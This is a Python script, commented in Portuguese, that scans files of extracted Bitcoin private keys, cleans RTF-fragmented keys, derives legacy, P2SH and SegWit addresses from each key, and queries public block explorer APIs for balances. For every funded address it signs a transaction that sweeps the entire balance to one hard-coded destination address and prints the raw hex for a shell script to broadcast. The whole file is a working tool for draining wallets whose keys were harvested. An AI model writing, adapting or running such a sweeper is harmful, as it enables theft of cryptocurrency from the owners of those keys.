import requests
import re
import time
import sys
import hashlib
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

# --- CONFIGURAÇÕES ---
DEST_ADDRESS = 'bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk'
FILES_TO_SCAN = ['privatekeys.txt', 'priv.key.rtf', 'chavprivelet1.txt', 'chaves_extraidas_e_enderecos_1.txt']

def deep_clean_rtf(raw_content):
    """Remove metadados RTF para limpar chaves fragmentadas"""
    text = re.sub(r'\\[a-z0-9]+(?:\s|-?\d+)?', '', raw_content)
    text = re.sub(r'[{}]', '', text)
    return "".join(text.split())

def check_balance_api(address):
    """Consulta saldo em múltiplas APIs"""
    apis = [
        f"https://mempool.space/api/address/{address}",
        f"https://blockstream.info/api/address/{address}"
    ]
    for api_url in apis:
        try:
            r = requests.get(api_url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                stats = data.get('chain_stats', {})
                return stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
        except: continue
    return 0

def create_hex_transaction(addr, wif, utxos_val):
    """Cria e assina a transação, gerando o HEX para o Shell"""
    try:
        r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=15)
        if r.status_code != 200: return
        utxos = r.json()
        if not utxos: return

        tx = Transaction(network='bitcoin')
        fee = 32000 # Taxa agressiva para prioridade
        amount = utxos_val - fee
        
        if amount > 1000:
            for u in utxos:
                tx.add_input(prev_txid=u['txid'], output_n=u['vout'], value=u['value'], address=addr)
            tx.add_output(value=amount, address=DEST_ADDRESS)
            tx.sign([wif])
            
            # Formato que o script Shell captura
            print(f"HEX_GEN:{tx.raw_hex()}")
            sys.stdout.flush()
        else:
            print(f"⚠️ Saldo insuficiente para taxa em {addr}")
            sys.stdout.flush()
    except Exception as e:
        print(f"💥 Erro ao assinar {addr}: {e}")
        sys.stdout.flush()

def run_nuclear_scan():
    print("☢️ INICIANDO VARREDURA TOTAL (WIF + HEX + DERIVAÇÕES)...")
    sys.stdout.flush()
    
    potential_keys = set()
    target_addresses = set()
    
    # 1. Extração de dados
    for file_path in FILES_TO_SCAN:
        try:
            with open(file_path, 'r', errors='ignore') as f:
                content = f.read()
                if file_path.endswith('.rtf'):
                    content = deep_clean_rtf(content)
                
                # Captura WIFs e HEX de 64 caracteres
                potential_keys.update(re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content))
                potential_keys.update(re.findall(r'\b[0-9a-fA-F]{64}\b', content))
                # Captura endereços para log de referência
                target_addresses.update(re.findall(r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59}', content))
        except: continue

    print(f"📊 Endereços no arquivo: {len(target_addresses)}")
    print(f"🔑 Chaves para testar: {len(potential_keys)}")
    sys.stdout.flush()

    # 2. Varredura de saldos nos endereços encontrados (Apenas para Log)
    for addr in target_addresses:
        bal = check_balance_api(addr)
        if bal > 0:
            print(f"🚨 ALVO COM SALDO: {addr} | {bal} sats")
            sys.stdout.flush()

    # 3. Cruzamento de Chaves (Força Bruta de Derivação)
    print("🔄 Cruzando chaves privadas com formatos de rede...")
    for key_item in potential_keys:
        for is_comp in [True, False]:
            try:
                # Converte HEX/WIF seguindo padrão Base58Check
                k = Key(key_item, network='bitcoin', compressed=is_comp)
                
                # Testa todos os endereços que esta chave pode gerar
                for addr_gen in [k.address(), k.address(witness_type='p2sh-p2wpkh'), k.address(witness_type='p2wpkh')]:
                    balance = check_balance_api(addr_gen)
                    if balance > 0:
                        print(f"💰 CHAVE VÁLIDA! {addr_gen} | Saldo: {balance} sats")
                        sys.stdout.flush()
                        create_hex_transaction(addr_gen, k.wif(), balance)
            except: continue
        time.sleep(0.02) # Evita Rate Limit

if __name__ == "__main__":
    run_nuclear_scan()
